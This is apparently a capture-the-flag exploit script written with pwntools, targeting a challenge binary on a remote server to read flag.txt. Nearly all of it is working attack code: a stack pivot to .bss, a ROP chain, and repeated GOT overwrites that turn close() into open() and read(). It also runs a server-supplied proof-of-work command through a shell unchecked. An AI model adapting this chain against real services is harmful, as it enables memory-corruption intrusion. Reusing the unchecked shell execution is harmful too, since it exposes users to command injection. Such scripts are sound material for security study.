#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

host, port = "mc.ax", "31173"

filename = './main'


elf = ELF(filename)

p = remote(host,port)
p.readuntil('work: ', drop=True)
command = p.recvuntil('\n', drop=True)

q = process(command, shell=True)
answer = q.recvline()
q.close()
p.send(answer)

# offset from close to open
offset = (0x100000000 - 0xb20)&0xffffffff

#function to read 128 bytes from stdin with fgets
readdata = 0x400757

# buffer on bss
buff = 0x601a00

# various gadgets
gadget1 = 0x0000000000400738 # add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
gadget2 = 0x4008fa # pop rbx/rbp/r12/r13/r14/r15/ret
gadget3 = 0x0000000000400903 # pop rdi ; ret
gadget4 = 0x0000000000400901 # pop rsi ; pop r15 ; ret
gadget5 = 0x00000000004008fd # pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
gadget6 = 0x4008e0  # libcsu gadget
p.sendlineafter('data:\n', 'A')

 # first payload call readdata 0x400757 function to pivot on .bss
payload1 = p64(0xdeadbeef)*5
payload1 += p64(gadget3)+p64(buff)+p64(readdata)
payload1 += p64(gadget3)+p64(buff+0x80)+p64(readdata)
payload1 += p64(gadget5)+p64(buff-24)		# stack pivot

p.sendlineafter('ID:\n', payload1)

# second payload change close open
payload2 = p64(gadget2)+p64(offset)+p64(elf.got['close']+0x3d)+p64(0xdeadbeef)*4
# open /tmp/stdout as fd 1  (new stdout)
payload2 += p64(gadget1)+p64(gadget3)+p64(buff+0x80+(9*8))+p64(gadget4)+p64(1)+p64(0)+p64(elf.symbols['close'])+p64(gadget3)

# open flag.txt as fd 2 
payload3 = p64(gadget3)+p64(buff+0x80+(9*8)+12)+p64(gadget4)+p64(0)+p64(0)+p64(elf.symbols['close'])+ p64(gadget3)+p64(buff+0x80+(9*8))+p64(readdata) + '/tmp/stdout\x00'+'flag.txt\x00'

#Â 0x2ec offset from open to read, we change open to read & read the last payload5
payload4 = p64(gadget2)+p64(0x2ec)+p64(elf.got['close']+0x3d)+p64(0xdeadbeef)*4+p64(gadget1)+  p64(gadget2)+p64(0)+p64(1)+p64(elf.got['close'])+p64(0)+p64(buff+0x80+(8*8)+0x7e)+p64(0x200)+p64(gadget6)

# 5th payload we read flag & dump it to stdout.. 
payload5 = p64(gadget2)+p64(0)+p64(1)+p64(elf.got['close'])+p64(2)+p64(buff)+p64(0x200)+p64(gadget6) + p64(0xdeadbeef)*7+ p64(gadget3)+p64(buff)+p64(elf.symbols['puts'])+p64(elf.symbols['_exit'])

p.sendline(payload2)
p.sendline(payload3)
p.sendline(payload4)
p.send(payload5)

p.interactive()
